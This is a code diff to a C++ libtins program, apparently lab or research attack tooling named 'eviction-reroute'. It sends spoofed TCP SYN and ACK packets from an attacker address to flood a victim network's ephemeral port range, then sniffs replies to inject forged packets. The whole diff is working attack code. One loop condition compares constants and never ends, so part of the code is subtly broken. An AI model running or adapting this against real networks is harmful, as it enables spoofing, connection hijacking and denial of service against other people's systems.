@@ -19,17 +19,18 @@ using std::vector;
 using namespace Tins;
 
 string iface;
+string attacker_priv_ip = "10.8.0.10";
 
+#define PORT_RANGE_START 32768
+#define PORT_RANGE_END 61000
 void tcp_attack_packets_fn() {
 
 	/*Send a bunch of TCP SYN's from attacker*/
-#define PORT_RANGE_START 1 
-#define PORT_RANGE_END 62000
 
 	PacketSender sender;
 	NetworkInterface iface(iface);
 
-	IP pkt = IP("192.168.3.131") / TCP(PORT_RANGE_START, 80);
+	IP pkt = IP("192.168.3.131", attacker_priv_ip) / TCP(PORT_RANGE_START, 80);
 	IP& ip = pkt.rfind_pdu<IP>();
 	TCP& tcp = pkt.rfind_pdu<TCP>();
 	tcp.set_flag(TCP::SYN, 1);
@@ -49,21 +50,19 @@ void tcp_attack_packets_fn() {
 
 void tcp_fill_ephemeral_port_range() {
 	/*Send a bunch of TCP SYN's from attacker*/
-#define PORT_RANGE_START 1 
-#define PORT_RANGE_END 62000
 
 	string victim_ip = "192.168.3.13";
 	string prefix = "192.168.3.";
 	PacketSender sender;
 	NetworkInterface iface(iface);
-	IP pkt = IP(victim_ip) / TCP(PORT_RANGE_START, PORT_RANGE_START);
+	IP pkt = IP(victim_ip, attacker_priv_ip) / TCP(PORT_RANGE_START, PORT_RANGE_START);
 	IP& ip = pkt.rfind_pdu<IP>();
 	TCP& tcp = pkt.rfind_pdu<TCP>();
-	tcp.set_flag(TCP::SYN, 1);
+	tcp.set_flag(TCP::ACK, 1);
 	tcp.seq(12345);
 	tcp.ack_seq(0);
 
-	IP atk_pkt = IP("192.168.3.131") / TCP(PORT_RANGE_START, 80);
+	IP atk_pkt = IP("192.168.3.131", "10.8.0.6") / TCP(PORT_RANGE_START, 80);
 	IP& atk_ip = atk_pkt.rfind_pdu<IP>();
 	TCP& atk_tcp = atk_pkt.rfind_pdu<TCP>();
 	atk_tcp.set_flag(TCP::SYN, 1);
@@ -76,17 +75,20 @@ void tcp_fill_ephemeral_port_range() {
 				sport < PORT_RANGE_END; sport++) {
 			for (unsigned short dport = PORT_RANGE_START;
 					dport < PORT_RANGE_END; dport++) {
-				for (int octet = 13; 13 < 255; octet++){
+				for (int octet = 13; 13 < 25; octet++){
                                         string daddr = prefix + std::to_string(octet);
                                         ip.dst_addr(daddr);
 					tcp.dport(dport);
 					tcp.sport(sport);
 					ip.ttl(2);
 					sender.send(pkt, iface);
-					usleep(10);
-					sender.send(atk_pkt,iface);
+					usleep(100);
+					sender.send(atk_pkt, iface);
+					usleep(100);
 				}
+				usleep(100);
 			}
+			usleep(100);
 		}	
 		usleep(10000000);
 	}
@@ -120,7 +122,7 @@ bool _sniff_tcp_response_target(PDU &some_pdu) {
 		TCP& tcp_resp = some_pdu.rfind_pdu<TCP>();
 		unsigned short sport = tcp_resp.sport();
 		unsigned short dport = tcp_resp.dport();
-		IP pkt = IP("192.168.2.254", ip_resp.dst_addr()) / TCP(sport, dport)/RawPDU("0xdeadbeef");
+		IP pkt = IP(ip_resp.src_addr(), ip_resp.dst_addr()) / TCP(sport, dport)/RawPDU("0xdeadbeef");
 		TCP& tcp = pkt.rfind_pdu<TCP>();
 		IP& ip = pkt.rfind_pdu<IP>();
 		tcp.seq(12345);
@@ -194,8 +196,6 @@ void _sniff_tcp_response_attacker_handler() {
 
 
 void udp_fill_ephemeral_port_range() {
-#define PORT_RANGE_START 1 
-#define PORT_RANGE_END 62000
 
 	PacketSender sender;
 	NetworkInterface iface(iface);
@@ -271,6 +271,7 @@ int main(int argc, char** argv) {
 	}
 
 	iface = argv[1];
+	std::cout << "eviction-reroute: iface=" << iface << std::endl;
 	bool do_tcp = true;
 	bool do_attacker = true;
 	if (do_tcp) {
